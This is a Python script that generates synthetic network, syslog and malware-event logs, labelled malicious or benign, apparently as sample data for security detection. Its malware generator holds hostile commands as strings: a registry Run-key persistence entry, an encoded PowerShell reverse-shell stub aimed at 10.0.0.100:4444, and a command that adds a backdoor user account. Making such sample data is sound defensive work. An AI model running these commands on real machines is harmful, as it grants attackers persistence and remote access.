import random
import datetime
import json
import csv
from typing import Dict, Any
import uuid

class NetworkLogGenerator:
    def __init__(self):
        self.bad_ips = [
            "93.184.216.34",  # Example bad IP
            "192.168.1.100",  # Example internal bad IP
            "10.0.0.99"       # Example internal bad IP
        ]
        self.protocols = ["tcp", "udp"]
        self.services = ["http", "https", "dns", "ssh", "ftp"]
        
    def generate_connection_log(self, is_malicious: bool = False) -> Dict[str, Any]:
        timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
        uid = f"C{uuid.uuid4().hex[:8]}"
        
        # Generate source IP (internal)
        src_ip = f"10.0.0.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)
        
        # Generate destination IP (external or internal)
        if is_malicious and random.random() < 0.7:
            dst_ip = random.choice(self.bad_ips)
        else:
            dst_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        dst_port = random.randint(1, 65535)
        proto = random.choice(self.protocols)
        service = random.choice(self.services)
        duration = random.uniform(0.1, 300.0)
        orig_bytes = random.randint(100, 10000)
        resp_bytes = random.randint(100, 10000)
        
        return {
            "ts": timestamp,
            "uid": uid,
            "id.orig_h": src_ip,
            "id.orig_p": src_port,
            "id.resp_h": dst_ip,
            "id.resp_p": dst_port,
            "proto": proto,
            "service": service,
            "duration": duration,
            "orig_bytes": orig_bytes,
            "resp_bytes": resp_bytes,
            "label": "malicious" if is_malicious else "benign"
        }

class SystemLogGenerator:
    def __init__(self):
        self.facilities = {
            "auth": 4,
            "daemon": 3,
            "kern": 0,
            "user": 1,
            "local0": 16,
            "local1": 17,
            "local2": 18,
            "local3": 19,
            "local4": 20,
            "local5": 21,
            "local6": 22,
            "local7": 23
        }
        self.severities = {
            "emerg": 0,
            "alert": 1,
            "crit": 2,
            "err": 3,
            "warning": 4,
            "notice": 5,
            "info": 6,
            "debug": 7
        }
        
    def generate_syslog(self, is_malicious: bool = False) -> str:
        timestamp = datetime.datetime.now().strftime("%b %d %H:%M:%S")
        hostname = f"host{random.randint(1, 10)}"
        
        if is_malicious:
            # Generate suspicious system activity
            messages = [
                f"sudo: 'su root' failed for user on /dev/pts/0",
                f"sshd[1234]: Invalid user admin from 10.0.0.20 port 34567",
                f"httpd: Suspicious URL access: http://malicious.example.com/login.php",
                f"antivirus: Malware detected: BadWare.exe"
            ]
            facility = "auth"
            severity = "warning"
        else:
            # Generate normal system activity
            messages = [
                f"systemd: Started Daily apt upgrade and clean activities.",
                f"cron[1234]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))",
                f"kernel: [0.000000] Linux version 5.4.0-42-generic"
            ]
            facility = random.choice(list(self.facilities.keys()))
            severity = random.choice(list(self.severities.keys()))
        
        priority = (self.facilities[facility] * 8) + self.severities[severity]
        message = random.choice(messages)
        
        return f"<{priority}>{timestamp} {hostname} {message}"

class MalwareEventGenerator:
    def __init__(self):
        self.malicious_processes = [
            "BadWare.exe",
            "CryptoMiner.exe",
            "Keylogger.exe",
            "Ransomware.exe"
        ]
        self.suspicious_commands = [
            "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /t REG_SZ /d C:\\Windows\\System32\\malware.exe",
            "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxADAAMAAiACwANAA0ADQANAApAA==",
            "cmd.exe /c net user hacker Password123 /add"
        ]
        
    def generate_malware_event(self) -> Dict[str, Any]:
        timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
        hostname = f"host{random.randint(1, 10)}"
        
        event_type = random.choice(["process_create", "file_access", "registry_change"])
        
        if event_type == "process_create":
            process_name = random.choice(self.malicious_processes)
            return {
                "timestamp": timestamp,
                "host": hostname,
                "event_type": event_type,
                "process_name": process_name,
                "params": "--encrypt" if "Crypto" in process_name else "--stealth"
            }
        elif event_type == "file_access":
            return {
                "timestamp": timestamp,
                "host": hostname,
                "event_type": event_type,
                "file_path": f"C:\\Windows\\Temp\\{random.choice(self.malicious_processes)}",
                "access_type": "write"
            }
        else:  # registry_change
            return {
                "timestamp": timestamp,
                "host": hostname,
                "event_type": event_type,
                "process": "cmd.exe",
                "command": random.choice(self.suspicious_commands)
            }

def generate_sample_data(num_records: int = 1000, output_dir: str = "data-gen"):
    network_gen = NetworkLogGenerator()
    system_gen = SystemLogGenerator()
    malware_gen = MalwareEventGenerator()
    
    # Generate network logs
    with open(f"{output_dir}/network_logs/connections.csv", "w", newline='') as f:
        writer = csv.DictWriter(f, fieldnames=[
            "ts", "uid", "id.orig_h", "id.orig_p", "id.resp_h", "id.resp_p",
            "proto", "service", "duration", "orig_bytes", "resp_bytes", "label"
        ])
        writer.writeheader()
        for _ in range(num_records):
            is_malicious = random.random() < 0.1  # 10% malicious
            writer.writerow(network_gen.generate_connection_log(is_malicious))
    
    # Generate system logs
    with open(f"{output_dir}/system_logs/syslog.txt", "w") as f:
        for _ in range(num_records):
            is_malicious = random.random() < 0.1  # 10% malicious
            f.write(system_gen.generate_syslog(is_malicious) + "\n")
    
    # Generate malware events
    with open(f"{output_dir}/malware_events/events.jsonl", "w") as f:
        for _ in range(num_records // 10):  # Fewer malware events
            f.write(json.dumps(malware_gen.generate_malware_event()) + "\n")

if __name__ == "__main__":
    print("Generating sample data...")
    generate_sample_data(1000) 
    print("Sample data generated successfully.")